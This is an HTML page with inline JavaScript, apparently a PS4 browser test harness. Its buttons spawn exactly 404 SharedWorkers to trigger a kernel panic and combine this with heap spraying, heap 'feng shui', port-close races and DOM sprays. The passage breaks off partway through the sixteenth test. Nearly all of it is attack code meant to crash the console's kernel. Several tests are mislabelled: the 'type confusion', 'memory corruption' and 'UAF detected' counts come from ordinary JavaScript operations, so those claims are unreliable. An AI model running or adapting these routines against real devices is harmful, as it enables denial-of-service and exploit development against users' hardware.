<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Surgical Tests - 404 Worker Threshold</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .test-section {
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        button {
            border: none;
            padding: 10px 20px;
            margin: 5px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 3px;
        }
        #log {
            border: 1px solid #000;
            padding: 10px;
            height: 400px;
            overflow-y: auto;
            font-size: 11px;
            margin-top: 20px;
        }
        .log-entry {
            padding: 2px 0;
        }
        .metrics {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        .metric-box {
            border: 1px solid #000;
            padding: 10px;
            text-align: center;
        }
        .metric-value {
            font-size: 28px;
            font-weight: bold;
        }
        .progress-bar {
            width: 100%;
            height: 30px;
            border: 1px solid #000;
            margin: 10px 0;
            position: relative;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #0f0, #ff0, #f00);
            transition: width 0.3s;
        }
        .progress-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-weight: bold;
            text-shadow: 0 0 3px #000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>PS4 SURGICAL THRESHOLD TESTS</h1>
        <h2>Target: 404 Workers = Kernel Panic | 403 Workers = Safe</h2>

        <div>
            <h3>TIMER MONITOR</h3>
            <div class="progress-bar">
                <div class="progress-fill" id="timerBar" style="width: 0%"></div>
                <div class="progress-text" id="timerText">0s / 12s</div>
            </div>
            <p id="timerStatus">Aguardando início do teste...</p>
        </div>

        <div class="test-section">
            <div class="metrics">
                <div class="metric-box">
                    <div>Workers Ativos</div>
                    <div class="metric-value" id="workerCount">0</div>
                </div>
                <div class="metric-box">
                    <div>Tempo Decorrido</div>
                    <div class="metric-value" id="timeElapsed">0s</div>
                </div>
                <div class="metric-box">
                    <div>UAF Detectados</div>
                    <div class="metric-value" id="uafCount">0</div>
                </div>
                <div class="metric-box">
                    <div>Memory Corruptions</div>
                    <div class="metric-value" id="corruptCount">0</div>
                </div>
            </div>
        </div>

        <div class="test-section">
            <h3>PRECISION TESTS (404 Workers)</h3>
            <button onclick="test404Exact()">1. 404 Workers Exactly (12s wait)</button>
            <button onclick="test404Instant()">2. 404 Workers Instant Spawn</button>
            <button onclick="test404Delayed()">3. 403→404 Transition Test</button>
            <button onclick="test404WithUAF()">4. 404 + UAF Race Condition</button>
            <button onclick="test404WithHeapSpray()">5. 404 + Heap Spray Pattern</button>
            <button onclick="test404WithMemCorrupt()">6. 404 + Memory Corruption</button>
        </div>

        <div class="test-section">
            <h3>EDGE CASE TESTS</h3>
            <button onclick="test403Safe()">7. 403 Workers (Safe Baseline)</button>
            <button onclick="test405Overflow()">8. 405 Workers (Overflow Test)</button>
            <button onclick="testRapidCycle()">9. Rapid 403↔404 Cycling</button>
            <button onclick="testMessageFlood404()">10. 404 + Message Flood</button>
            <button onclick="testPortCorruption404()">11. 404 + Port Corruption</button>
            <button onclick="testStructuredClone404()">12. 404 + Structured Clone UAF</button>
        </div>

        <div class="test-section">
            <h3>MEMORY MANIPULATION TESTS</h3>
            <button onclick="testHeapFengShui404()">13. 404 + Heap Feng Shui</button>
            <button onclick="testTypeConfusion404()">14. 404 + Type Confusion</button>
            <button onclick="testVTableCorrupt404()">15. 404 + VTable Corruption</button>
            <button onclick="testArrayBufferDetach404()">16. 404 + ArrayBuffer Detach</button>
            <button onclick="testBackingStore404()">17. 404 + Backing Store Corrupt</button>
            <button onclick="testJSObjectSpray404()">18. 404 + JSObject Spray</button>
        </div>

        <div class="test-section">
            <h3>KERNEL STRESS TESTS</h3>
            <button onclick="testAtomics404()">19. 404 + Atomics Race</button>
            <button onclick="testSharedBuffer404()">20. 404 + SharedArrayBuffer</button>
            <button onclick="testPthreadCorrupt404()">21. 404 + Pthread TCB Corrupt</button>
            <button onclick="testSignalStack404()">22. 404 + Signal Stack Corrupt</button>
            <button onclick="testFileDescriptor404()">23. 404 + FD Exhaustion</button>
            <button onclick="testMemoryPressure404()">24. 404 + Memory Pressure</button>
        </div>

        <div class="test-section">
            <button onclick="stopAll()" style="background:#f00;color:#fff;">EMERGENCY STOP</button>
        </div>

        <div id="log"></div>
    </div>

    <script>
        let activeWorkers = [];
        let intervals = [];
        let testStartTime = null;
        let stats = {
            workers: 0,
            uaf: 0,
            corrupt: 0,
            timeElapsed: 0
        };

        function log(msg, color = '#000') {
            const el = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            el.innerHTML += `<div class="log-entry" style="color: ${color}">[${time}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function updateStats() {
            document.getElementById('workerCount').textContent = stats.workers;
            document.getElementById('uafCount').textContent = stats.uaf;
            document.getElementById('corruptCount').textContent = stats.corrupt;
            
            if (testStartTime) {
                stats.timeElapsed = Math.floor((Date.now() - testStartTime) / 1000);
                document.getElementById('timeElapsed').textContent = stats.timeElapsed + 's';
                
                const progress = Math.min((stats.timeElapsed / 12) * 100, 100);
                document.getElementById('timerBar').style.width = progress + '%';
                document.getElementById('timerText').textContent = stats.timeElapsed + 's / 12s';
                
                if (stats.timeElapsed >= 12 && stats.workers >= 404) {
                    document.getElementById('timerStatus').textContent = 'CRITICAL: 12s elapsed with 404 workers!';
                    document.getElementById('timerStatus').style.color = '#f00';
                } else if (stats.workers >= 404) {
                    document.getElementById('timerStatus').textContent = 'WARNING: 404 workers active, waiting for 12s...';
                    document.getElementById('timerStatus').style.color = '#ff0';
                } else {
                    document.getElementById('timerStatus').textContent = 'Test in progress...';
                    document.getElementById('timerStatus').style.color = '#000';
                }
            }
        }

        function stopAll() {
            intervals.forEach(id => clearInterval(id));
            intervals = [];
            activeWorkers.forEach(w => {
                try { w.port.close(); } catch(e) {}
            });
            activeWorkers = [];
            stats.workers = 0;
            testStartTime = null;
            updateStats();
            log('EMERGENCY STOP: All tests terminated', '#f00');
        }

        function getBasicWorkerCode() {
            return `
                let alive = true;
                onmessage = (e) => {
                    if (e.data === "ping" && e.ports && e.ports[0]) {
                        const port = e.ports[0];
                        const interval = setInterval(() => {
                            if (alive) {
                                try {
                                    port.postMessage({type: 'heartbeat', time: Date.now()});
                                } catch(e) {
                                    clearInterval(interval);
                                }
                            }
                        }, 100);
                    } else if (e.data === "die") {
                        alive = false;
                        close();
                    }
                }
            `;
        }

        // TEST 1: Exactly 404 workers, wait 12 seconds
        function test404Exact() {
            log('=== TEST 1: 404 WORKERS EXACTLY (12s WAIT) ===', '#00f');
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            
            testStartTime = Date.now();
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "exact404_" + i);
                sw.port.start();
                sw.port.postMessage("ping", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            updateStats();
            log('404 workers spawned. Waiting 12 seconds for kernel panic...', '#ff0');
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 2: 404 workers instant spawn
        function test404Instant() {
            log('=== TEST 2: 404 WORKERS INSTANT ===', '#00f');
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            
            testStartTime = Date.now();
            const spawnStart = performance.now();
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "instant404_" + i);
                sw.port.start();
                sw.port.postMessage("ping", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            const spawnTime = (performance.now() - spawnStart).toFixed(2);
            log('404 workers spawned in ' + spawnTime + 'ms', '#0f0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 3: 403→404 transition
        function test404Delayed() {
            log('=== TEST 3: 403→404 TRANSITION ===', '#00f');
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            
            testStartTime = Date.now();
            
            // Spawn 403 (safe)
            for (let i = 0; i < 403; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "transition_" + i);
                sw.port.start();
                sw.port.postMessage("ping", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('403 workers spawned (safe). Waiting 2s...', '#0f0');
            updateStats();
            
            // Wait 2s, then add the 404th
            setTimeout(() => {
                log('Adding 404th worker NOW...', '#ff0');
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "transition_404");
                sw.port.start();
                sw.port.postMessage("ping", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
                updateStats();
                log('404th worker added. Monitoring for 12s...', '#ff0');
            }, 2000);
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 4: 404 + UAF Race
        function test404WithUAF() {
            log('=== TEST 4: 404 + UAF RACE CONDITION ===', '#00f');
            
            const workerCode = `
                let activePort = null;
                onmessage = (e) => {
                    if (e.ports && e.ports[0]) {
                        activePort = e.ports[0];
                        const sendLoop = () => {
                            try {
                                activePort.postMessage({data: Date.now()});
                                setTimeout(sendLoop, 0);
                            } catch(e) {}
                        };
                        sendLoop();
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            testStartTime = Date.now();
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "uaf404_" + i);
                
                let portClosed = false;
                sw.port.onmessage = (e) => {
                    if (portClosed) {
                        stats.uaf++;
                        log('UAF detected in worker ' + i, '#f00');
                        updateStats();
                    }
                };
                
                sw.port.start();
                sw.port.postMessage("start", [mc.port2]);
                
                setTimeout(() => {
                    portClosed = true;
                    sw.port.close();
                    mc.port1.close();
                }, Math.random() * 20);
                
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('404 workers with UAF trigger spawned', '#ff0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 5: 404 + Heap Spray
        function test404WithHeapSpray() {
            log('=== TEST 5: 404 + HEAP SPRAY ===', '#00f');
            
            // Phase 1: Heap spray
            const spray = [];
            for (let i = 0; i < 500; i++) {
                const buf = new ArrayBuffer(4096);
                const view = new Uint32Array(buf);
                view.fill(0xDEADBEEF);
                spray.push(buf);
            }
            log('Heap sprayed with 2MB of 0xDEADBEEF pattern', '#0f0');
            
            // Phase 2: 404 workers
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            testStartTime = Date.now();
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "spray404_" + i);
                sw.port.start();
                sw.port.postMessage("ping", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('404 workers spawned in sprayed heap', '#ff0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 6: 404 + Memory Corruption
        function test404WithMemCorrupt() {
            log('=== TEST 6: 404 + MEMORY CORRUPTION ===', '#00f');
            
            const workerCode = `
                onmessage = (e) => {
                    if (e.ports && e.ports[0]) {
                        const port = e.ports[0];
                        // Corrupt memory via buffer overflow attempt
                        const arr = new Array(1000);
                        arr.fill({overflow: new ArrayBuffer(8192)});
                        
                        port.postMessage({status: 'corrupted'});
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            testStartTime = Date.now();
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "corrupt404_" + i);
                
                sw.port.onmessage = (e) => {
                    if (e.data.status === 'corrupted') {
                        stats.corrupt++;
                        updateStats();
                    }
                };
                
                sw.port.start();
                sw.port.postMessage("corrupt", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('404 workers with memory corruption spawned', '#ff0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 7: 403 Safe Baseline
        function test403Safe() {
            log('=== TEST 7: 403 WORKERS (SAFE BASELINE) ===', '#00f');
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            
            testStartTime = Date.now();
            
            for (let i = 0; i < 403; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "safe403_" + i);
                sw.port.start();
                sw.port.postMessage("ping", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('403 workers spawned (should be safe)', '#0f0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 8: 405 Overflow
        function test405Overflow() {
            log('=== TEST 8: 405 WORKERS (OVERFLOW) ===', '#00f');
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            
            testStartTime = Date.now();
            
            for (let i = 0; i < 405; i++) {
                try {
                    const mc = new MessageChannel();
                    const sw = new SharedWorker(url, "overflow405_" + i);
                    sw.port.start();
                    sw.port.postMessage("ping", [mc.port2]);
                    activeWorkers.push(sw);
                    stats.workers++;
                } catch(e) {
                    log('ERROR at worker ' + i + ': ' + e.message, '#f00');
                    break;
                }
            }
            
            log('Attempted 405 workers', '#ff0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 9: Rapid Cycling
        function testRapidCycle() {
            log('=== TEST 9: RAPID 403↔404 CYCLING ===', '#00f');
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            
            testStartTime = Date.now();
            let cycle = 0;
            
            const doCycle = () => {
                // Clear existing
                activeWorkers.forEach(w => {
                    try { w.port.close(); } catch(e) {}
                });
                activeWorkers = [];
                stats.workers = 0;
                
                // Spawn 403 or 404 alternating
                const count = (cycle % 2 === 0) ? 403 : 404;
                
                for (let i = 0; i < count; i++) {
                    const mc = new MessageChannel();
                    const sw = new SharedWorker(url, "cycle" + cycle + "_" + i);
                    sw.port.start();
                    sw.port.postMessage("ping", [mc.port2]);
                    activeWorkers.push(sw);
                    stats.workers++;
                }
                
                log('Cycle ' + cycle + ': ' + count + ' workers', '#ff0');
                updateStats();
                
                cycle++;
                if (cycle < 10) {
                    setTimeout(doCycle, 500);
                } else {
                    log('Cycling complete', '#0f0');
                }
            };
            
            doCycle();
        }

        // TEST 10: Message Flood
        function testMessageFlood404() {
            log('=== TEST 10: 404 + MESSAGE FLOOD ===', '#00f');
            
            const workerCode = `
                onmessage = (e) => {
                    if (e.ports && e.ports[0]) {
                        const port = e.ports[0];
                        // Flood messages
                        for (let i = 0; i < 100; i++) {
                            try {
                                port.postMessage({id: i, data: new ArrayBuffer(1024)});
                            } catch(e) { break; }
                        }
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            testStartTime = Date.now();
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "flood404_" + i);
                sw.port.start();
                sw.port.postMessage("flood", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('404 workers flooding messages', '#ff0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 11: Port Corruption
        function testPortCorruption404() {
            log('=== TEST 11: 404 + PORT CORRUPTION ===', '#00f');
            
            const workerCode = `
                onmessage = (e) => {
                    if (e.ports && e.ports[0]) {
                        const port = e.ports[0];
                        // Try to corrupt port state
                        try {
                            port.close();
                            port.postMessage("corrupted");
                        } catch(e) {}
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            testStartTime = Date.now();
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "portcorrupt404_" + i);
                sw.port.start();
                sw.port.postMessage("corrupt", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('404 workers with port corruption', '#ff0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 12: Structured Clone UAF
        function testStructuredClone404() {
            log('=== TEST 12: 404 + STRUCTURED CLONE UAF ===', '#00f');
            
            testStartTime = Date.now();
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "clone404_" + i);
                
                // Create complex object with transferable
                const buf = new ArrayBuffer(2048);
                const obj = {
                    id: i,
                    buffer: buf,
                    nested: {data: new Uint8Array(buf)}
                };
                
                sw.port.start();
                sw.port.postMessage(obj, [buf]);
                
                // Try to access transferred buffer (UAF)
                try {
                    new Uint8Array(buf);
                    stats.uaf++;
                } catch(e) {}
                
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('404 workers with structured clone UAF', '#ff0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 13: Heap Feng Shui
        function testHeapFengShui404() {
            log('=== TEST 13: 404 + HEAP FENG SHUI ===', '#00f');
            
            // Phase 1: Create holes
            const holes = [];
            for (let i = 0; i < 1000; i++) {
                holes.push(new ArrayBuffer(2048));
            }
            for (let i = 0; i < holes.length; i += 2) {
                holes[i] = null;
            }
            log('Heap fragmented with holes', '#0f0');
            
            // Phase 2: Fill with controlled data
            for (let i = 0; i < 500; i++) {
                const buf = new ArrayBuffer(2048);
                const view = new Uint32Array(buf);
                view.fill(0xBAADF00D);
            }
            
            // Phase 3: 404 workers
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            testStartTime = Date.now();
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "fengshui404_" + i);
                sw.port.start();
                sw.port.postMessage("ping", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('404 workers in feng shui heap', '#ff0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 14: Type Confusion
        function testTypeConfusion404() {
            log('=== TEST 14: 404 + TYPE CONFUSION ===', '#00f');
            
            // Create type confusion
            const confused = [];
            for (let i = 0; i < 1000; i++) {
                const arr = new Array(100);
                arr.fill(i);
                arr.shift();
                arr.shift();
                confused.push(arr);
            }
            log('Type confusion arrays created', '#0f0');
            
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            testStartTime = Date.now();
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "typeconf404_" + i);
                sw.port.start();
                sw.port.postMessage("ping", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('404 workers with type confusion', '#ff0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 15: VTable Corruption
        function testVTableCorrupt404() {
            log('=== TEST 15: 404 + VTABLE CORRUPTION ===', '#00f');
            
            // Spray DOM objects (have vtables)
            const spray = [];
            for (let i = 0; i < 500; i++) {
                const div = document.createElement('div');
                div.id = 'vtable_' + i;
                spray.push(div);
            }
            log('DOM spray for vtable corruption', '#0f0');
            
            const url = URL.createObjectURL(new Blob([getBasicWorkerCode()], {type:"text/javascript"}));
            testStartTime = Date.now();
            
            for (let i = 0; i < 404; i++) {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "vtable404_" + i);
                sw.port.start();
                sw.port.postMessage("ping", [mc.port2]);
                activeWorkers.push(sw);
                stats.workers++;
            }
            
            log('404 workers with vtable corruption setup', '#ff0');
            updateStats();
            
            const interval = setInterval(updateStats, 100);
            intervals.push(interval);
        }

        // TEST 16: ArrayBuffer Detach
        function testArrayBufferDetach404() {
            log('=== TEST 16: 404 + ARRAYBUFFER DETACH ===', '#00f');
            
            const workerCode = `
                let detached = [];
                onmessage = (e) => {
                    if (e.ports && e.ports[0]) {
                        const port = e.ports[0];
                        const buf = new ArrayBuffer(4096);
                        const view = new Uint8Array(buf);
